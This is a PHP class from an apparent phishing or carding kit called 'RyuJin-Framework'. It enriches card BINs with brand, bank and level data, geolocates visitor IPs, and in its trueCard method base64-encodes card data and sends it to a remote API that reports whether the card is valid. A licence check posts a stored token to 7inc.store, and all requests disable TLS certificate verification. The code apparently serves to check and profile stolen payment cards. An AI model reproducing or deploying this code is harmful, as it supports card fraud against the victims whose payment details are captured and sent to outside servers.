<?php


Class RyuApi
{
    private $curl;
    private $api_url;
    public function __construct()
    {
        $this->curl = new RyuCurl;
        $this->api_url = CONFIG['web']['api_url'].'?';
    }
    public function paramBuilder($array = array())
    {
        return http_build_query($array);
    }
    public function fetchJson($json)
    {
       return json_decode($json,true);
    }
    public function apiBin($bin)
    {
         $this->curl->setUrl($this->api_url.$this->paramBuilder(['api' => 'bin','bin' => $bin]));
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('RyuJin-Framework');
        $this->curl->setVerifyPeer(false);
    
        $this->curl->buildOpt();
       return $this->fetchJson($this->curl->exec());
    }
    public function backupBin($bin)
    {
        
         $this->curl->setUrl('https://lookup.binlist.net/'.$bin);
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('RyuJin-Framework');
        $this->curl->setVerifyPeer(false);
        $this->curl->buildOpt();
       $data= $this->fetchJson($this->curl->exec());
       $re = ['brand' => $data['scheme'],
              'country' => $data['country']['name'],
              'type' => $data['type'],
              'bank' => $data['bank']['name'],
              'level' => ''
              ];
             return $re;
    }
    public function getBin($bin)
    {
       $get1 = $this->backupBin($bin);
       if(isset($get1['brand']))
       {
           return $get1;
       }else{
           return $this->apiBin($bin);
       }
    }
    public function backupCountry($ip)
    {
        
         $this->curl->setUrl('https://extreme-ip-lookup.com/json/'.$ip);
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('RyuJin-Framework');
        $this->curl->setVerifyPeer(false);
    
        $this->curl->buildOpt();
        return $this->fetchJson($this->curl->exec());
    }
    public function apiCountry($ip)
    {
        $this->curl->setUrl($this->api_url.$this->paramBuilder(['api' => 'country','ip' => $ip]));
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('RyuJin-Framework');
        $this->curl->setVerifyPeer(false);
    
        $this->curl->buildOpt();
        return $this->fetchJson($this->curl->exec());
    }
    public function getCountry($ip)
    {
        $get1 = $this->backupCountry($ip);
   
        
        if(isset($get1['countryCode']))
        {
           return $get1; 
        }else{
            return $this->apiCountry($ip);
        }
    }
    public function trueCard($data)
    {
        $data = base64_encode($data);
         $this->curl->setUrl($this->api_url.$this->paramBuilder(['api' => 'valid','data' => $data]));
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('RyuJin-Framework');
        $this->curl->setVerifyPeer(false);
    
        $this->curl->buildOpt();
        $response= $this->fetchJson($this->curl->exec());

        if($response['status'] == 'valid')
        {
            return true;
        }else{
            return false;
        }
    }
    public function validate()
    {
        if($this->validateToken() == false)
        {
            require dirname(__DIR__).'/setup.php';exit;
        }else{
            if(empty($_SESSION['validate_api'])){
            $_SESSION['validate_api'] = $this->validateToken();
            }else{
                return $_SESSION['validate_api'];
            }
        }
        return;
    }
    public function validateToken()
    {
        if(!file_exists(CONFIG_PATH.'.token'))
        {
           return false;
        }else
        {
            $toket = file_get_contents(CONFIG_PATH.'.token');
        }

        $this->curl->setUrl('https://7inc.store/?c=extend&a=validate');
        $this->curl->setTransfer();
        $this->curl->setFollow();
        $this->curl->setUserAgent('RyuJin-Framework:'.$toket);
        $this->curl->setVerifyPeer(false);
        $this->curl->setHeaderOneHit(['token:'.$toket]);
    
        $this->curl->buildOpt();
        $p =$this->fetchJson($this->curl->exec());
     
        if($p['status'] != 'valid')
        {
           return false;
        }else{
            return $p;
        }
    }
    
}